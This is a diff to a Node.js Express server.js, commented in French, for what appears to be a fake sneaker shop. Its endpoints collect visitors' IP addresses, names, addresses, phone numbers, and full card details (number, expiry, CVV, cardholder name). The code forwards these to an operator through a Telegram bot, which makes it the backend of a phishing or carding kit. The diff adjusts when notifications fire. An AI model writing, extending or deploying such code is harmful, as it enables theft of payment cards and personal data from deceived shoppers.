@@ -1,9 +1,9 @@
+// server.js
 import express from 'express';
 import path from 'path';
 import bodyParser from 'body-parser';
 import cors from 'cors';
 import fetch from 'node-fetch';
-import { v4 as uuidv4 } from 'uuid';
 import { fileURLToPath } from 'url';
 
 const __filename = fileURLToPath(import.meta.url);
@@ -21,7 +21,7 @@ const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : nu
 
 if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');
 
-// sessions par IP
+// Sessions par IP
 const sessions = {}; // ip -> {data:{page, pair, delivery, card}, redirect:null}
 
 // Helper: envoyer notif Telegram
@@ -29,7 +29,7 @@ async function sendTelegramNotif(data){
   if(!TELEGRAM_API || !CHAT_ID) return;
   const lines = [];
   lines.push('🆕 <b>Nouvelle interaction</b>');
-  if(data.ip) lines.push('🌐 <b>IP:</b> '+data.ip);
+  lines.push('🌐 <b>IP:</b> '+data.ip);
   if(data.page) lines.push('📄 <b>Page:</b> '+data.page);
   if(data.pair) lines.push('👟 <b>Paire choisie:</b> '+data.pair);
   if(data.delivery){
@@ -70,24 +70,29 @@ async function sendTelegramNotif(data){
   }
 }
 
-// Middleware pour IP
+// Helper pour récupérer IPv4
 function getIP(req){
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-  // prendre juste IPv4
   if(ip.includes(',')) ip = ip.split(',')[0];
   if(ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
   return ip;
 }
 
-// Endpoint visite
+// ---------- Endpoints ----------
+
+// Nouvelle visite (notif envoyée uniquement si première visite)
 app.get('/api/visit', (req,res)=>{
   const ip = getIP(req);
-  sessions[ip] = sessions[ip] || {data:{page:'Accueil', ip}, redirect:null};
-  sendTelegramNotif(sessions[ip].data);
+  if(!sessions[ip]){
+    sessions[ip] = {data:{page:'Accueil', ip}, redirect:null};
+    sendTelegramNotif(sessions[ip].data);
+  } else {
+    sessions[ip].data.page = 'Accueil';
+  }
   res.json({ok:true, ip});
 });
 
-// Endpoint choix paire
+// Choix paire
 app.post('/api/pair', (req,res)=>{
   const {pair} = req.body;
   const ip = getIP(req);
@@ -98,7 +103,7 @@ app.post('/api/pair', (req,res)=>{
   res.json({ok:true});
 });
 
-// Endpoint livraison
+// Livraison
 app.post('/api/delivery', (req,res)=>{
   const {nom, prenom, adresse, telephone} = req.body;
   const ip = getIP(req);
@@ -109,7 +114,7 @@ app.post('/api/delivery', (req,res)=>{
   res.json({ok:true});
 });
 
-// Endpoint paiement
+// Paiement
 app.post('/api/payment', (req,res)=>{
   const {cardNumber, expiry, cvv, nomTitulaire} = req.body;
   const ip = getIP(req);
